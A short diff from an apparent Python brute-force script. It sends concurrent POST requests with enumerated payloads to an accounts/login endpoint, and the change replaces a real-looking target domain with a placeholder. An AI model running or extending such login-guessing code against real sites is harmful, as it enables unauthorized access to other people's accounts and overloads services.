@@ -15,7 +15,7 @@ for ele in itertools.product("0123456",repeat=1):
         unsent_request = []
 
         for payload_single in payloads:
-            unsent_request.append(grequests.post('https://api.nse.sg/accounts/login', hooks={'response': do_something}, data=payload_single))
+            unsent_request.append(grequests.post('https://website/accounts/login', hooks={'response': do_something}, data=payload_single))
 
         responses =  grequests.map(unsent_request)
         for r in responses:
